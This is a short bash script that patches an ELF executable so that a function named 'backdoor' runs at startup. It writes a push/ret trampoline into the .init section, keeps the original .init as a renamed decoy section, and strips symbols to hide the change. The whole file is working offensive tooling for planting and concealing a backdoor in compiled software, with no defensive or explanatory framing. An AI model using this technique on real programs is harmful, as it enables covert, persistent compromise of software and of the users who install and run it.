#!/bin/bash
# Script to create a trampoline for redirecting to backdoor

set -e
PRE_FILE=$1
OUTPUT_FILE=$2

# Store the original .init to use as decoy
objcopy --dump-section .init=i1.bin ${PRE_FILE}

# Get function and section addresses
nm ${PRE_FILE}
ADDR1=$(nm ${PRE_FILE} | grep -E 'T\s+backdoor' | awk '{print "0x" $1}')
[ -z "$ADDR1" ] && ADDR1=$(nm ${PRE_FILE} | grep -i backdoor | awk '{print "0x" $1}')

objdump -j .init -h ${PRE_FILE}
ADDR2=$(objdump -j .init -h ${PRE_FILE} | grep '\.init' | awk '{print "0x" $4}')

echo "ADDR1=$ADDR1 ADDR2=$ADDR2"

# Create backdoor trampoline assembly
echo "BITS 64" > init_redirect.asm
echo "push $ADDR1" >> init_redirect.asm
echo "ret" >> init_redirect.asm
cat init_redirect.asm

# Create the binary
nasm -fbin -o i2.bin init_redirect.asm

# Insert the trampoline and decoy
objcopy --update-section .init=i2.bin \
        --rename-section .init=.xinit \
        --add-section=.init=i1.bin \
        --set-section-flags .init=alloc,code \
        --change-section-vma .init=$ADDR2 \
        ${PRE_FILE} ${OUTPUT_FILE}

# Strip symbols
strip -s ${OUTPUT_FILE}